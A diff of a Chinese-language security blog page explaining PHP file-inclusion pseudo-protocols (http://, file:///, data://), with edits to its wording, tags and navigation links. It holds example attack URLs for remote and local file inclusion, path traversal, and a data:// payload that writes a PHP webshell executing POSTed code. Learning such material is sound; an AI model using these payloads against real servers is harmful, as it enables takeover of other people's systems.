@@ -254,14 +254,14 @@
 <h3 id="伪协议使用实例"><a href="#伪协议使用实例" class="headerlink" title="伪协议使用实例"></a>伪协议使用实例</h3><h4 id="http"><a href="#http" class="headerlink" title="http://"></a>http://</h4><p>需要allow_url_fopen与allow_url_include同时开启</p>
 <figure class="highlight accesslog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>/a.php?page=http://<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/info.txt<br></code></pre></div></td></tr></table></figure>
 
-<p>如果能够使用那么效果会十分显著，木马文件在我们服务器上，却能直接控制对方的服务器</p>
+<p>效果十分显著，利用远程文件包含实现木马文件在我们服务器上，却能直接控制对方的服务器</p>
 <h4 id="file"><a href="#file" class="headerlink" title="file:///"></a>file:///</h4><p><strong>只能以绝对路径的方式包含本地文件</strong></p>
-<p>感觉file加了不如不加。。因为文件包含不用伪协议还能用相对路径。。</p>
+<p><em>感觉file加了不如不加。。因为文件包含不用伪协议还能用相对路径。。形如<code>127.0.0.1/a.php?page=../../x.txt</code>，也可以<code>127.0.0.1/a.php?page=F:/x.txt</code></em></p>
 <figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/a.php?page=file:///F:\aaa\bbb\info.txt</span><br></code></pre></div></td></tr></table></figure>
 
-<p>需要知道目标服务器的文件路径，有时可通过报错信息得知</p>
-<p>个人感觉比较鸡肋。。在dvwa中刚好满足白名单要求才有用得以绕过</p>
-<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>需要 allow_url_include:On allow_url_fopen:On</p>
+<p>需要知道目标服务器的文件路径，而路径的信息有时可通过报错信息得知</p>
+<p>个人感觉比较鸡肋。。</p>
+<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>需要 allow_url_include:On ，allow_url_fopen:On</p>
 <p>可以直接写入PHP代码执行</p>
 <p>写入PHP木马：</p>
 <figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?PHP</span> fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;<span class="hljs-meta">&lt;?php</span> @eval($_POST[eggs])<span class="hljs-meta">?&gt;</span>&#x27;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></div></td></tr></table></figure>
@@ -349,7 +349,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
+                      <a class="hover-with-bg" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a>
                     
                       <a class="hover-with-bg" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
                     
@@ -367,6 +367,12 @@
                 <div class="post-prevnext">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2022/04/04/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">XXE学习笔记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
